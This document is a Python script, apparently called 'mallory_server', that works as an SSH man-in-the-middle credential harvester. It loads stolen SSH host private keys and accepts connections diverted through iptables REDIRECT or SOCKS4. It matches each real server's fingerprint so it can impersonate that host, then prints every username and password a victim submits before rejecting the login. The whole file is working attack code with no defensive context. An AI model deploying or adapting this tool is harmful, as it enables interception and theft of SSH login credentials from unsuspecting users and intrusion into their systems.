#!/usr/bin/env python

import base64
from binascii import hexlify
import os
import socket
import sys
import threading
import traceback
import struct

import paramiko
from paramiko.py3compat import b, u, decodebytes


# setup logging
#paramiko.util.log_to_file('mallory_server.log')

class RejectingServer(paramiko.ServerInterface):
	identity = None

	def __init__(self, identity):
		self.identity = identity
		self.event = threading.Event()

	def check_auth_password(self, username, password):
		print("""Auth attempt to '%s' with user '%s' and password '%s'""" % (self.identity, username, password))
		return paramiko.AUTH_FAILED

	def get_allowed_auths(self, username):
		return 'password'


class Keyring:
	keys = {}

	def load_keyfile(self, filename):
		key = paramiko.RSAKey(filename=filename)
		fp = key.get_fingerprint()
		print('Read key ' + fmt_fp(u(hexlify(fp))) + ' from "' + filename +'"')
		self.keys[fp] = key

	def get_key(self, fp):
		if fp in self.keys:
			return self.keys[fp]
		else:
			return None

def fmt_fp(fp):
	n = 2
	tokens = [ fp[i:i+n] for i in xrange(0, len(fp), n) ]
	return ':'.join(tokens)

class SshTarget:
	hosts = {}

	def get_fp(self, dst, dport):
		if (dst, dport) not in self.hosts:
			fp = self.__get_server_fp(dst, dport)
			self.hosts[(dst, dport)] = fp

		return self.hosts[(dst, dport)]

	def __get_server_fp(self, dst, dport):
		client = paramiko.SSHClient()
		# now connect
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sock.connect((dst, dport))
		except Exception as e:
			print('*** Connect failed: ' + str(e))
			traceback.print_exc()
			return None
		t = paramiko.Transport(sock)
		try:
			t.start_client()
			key = t.get_remote_server_key()
			print('retrieved target fp: ' + fmt_fp(u(hexlify(key.get_fingerprint()))))
			return key.get_fingerprint()
		except paramiko.SSHException:
			print('*** SSH negotiation failed.')
			return None
		finally:
			t.close()
			sock.close()

def get_orig_dst(conn):
	SO_ORIGINAL_DST = 80
	sockaddr_in = conn.getsockopt(socket.SOL_IP, SO_ORIGINAL_DST, 16)
	(proto, port, a, b, c, d) = struct.unpack('!HHBBBB', sockaddr_in[:8])
	dst = "%d.%d.%d.%d" % (a, b, c, d)
	print('Original destination was: %s:%d' % (dst, port))
	return (dst, port)

def _read_bytes(file, n):
	data = b""
	while len(data) < n:
		d = file.read(1)
		if not d:
			raise IOError("Connection closed")
		data += d
	return data

def get_socks4_dst(conn):
	writer = conn.makefile("wb")
	reader = conn.makefile("rb", 0)
	try:
		req = _read_bytes(reader, 8)
		login = ""
		while True:
			d = _read_bytes(reader, 1)
			if d == b"\x00":
				break
			login += d

		(ver, cmd, port, addr_a, addr_b, addr_c, addr_d) = struct.unpack("!2BH4B", req)
		if not (ver == 0x04 and cmd == 0x01):
			raise IOError("Invalid SOCKS4 request")
		dst = "%d.%d.%d.%d" % (addr_a, addr_b, addr_c, addr_d)
		print('Original destination was: %s:%d (login: %s)' % (dst, port, login))
		reply = struct.pack("!2BH4B", 0, 0x5A, 0, 0, 0, 0, 0)
		writer.write(reply)
		return (dst, port)
	finally:
		writer.close()
		reader.close()

targets = SshTarget()

def handle_client(client):
	print('Incoming client connection connection!')
	#(dst, dport) = get_orig_dst(client)
	(dst, dport) = get_socks4_dst(client)

	fp = targets.get_fp(dst, dport)

	key = keyring.get_key(fp)
	if key is None:
		print('Unable to handle connection')
		client.close()
		return

	try:
		t = paramiko.Transport(client)
		t.set_gss_host(socket.getfqdn(""))
		try:
			t.load_server_moduli()
		except:
			print('(Failed to load moduli -- gex will be unsupported.)')
			raise
		t.add_server_key(key)
		server = RejectingServer("%s:%s" % (dst, dport))
		try:
			t.start_server(server=server)
		except paramiko.SSHException:
			print('*** SSH negotiation failed.')
			raise

		# wait for auth
		chan = t.accept(20)
		if chan is None:
			print('*** No channel.')
			raise Exception("No connection")
		print('Authenticated!')

	except Exception as e:
		print('*** Caught exception: ' + str(e.__class__) + ': ' + str(e))
		traceback.print_exc()
	finally:
		t.close()
		client.close()

keyring = Keyring()
for filename in sys.argv[1:]:
	keyring.load_keyfile(filename)

print('%u distinct host keys have been loaded into te key ring' % len(keyring.keys))

# bind the listening socket for iptables REDIRECT
try:
	ipt_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	ipt_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
	ipt_sock.bind(('', 2200))
except Exception as e:
	print('*** Bind failed: ' + str(e))
	traceback.print_exc()
	sys.exit(1)

while (1):
	try:
		ipt_sock.listen(0)
		print('Listening for connection ...')
		client, addr = ipt_sock.accept()
		handle_client(client)
	except Exception as e:
		print('*** Listen/accept failed: ' + str(e))
		traceback.print_exc()
		sys.exit(1)
	finally:
		client.close()
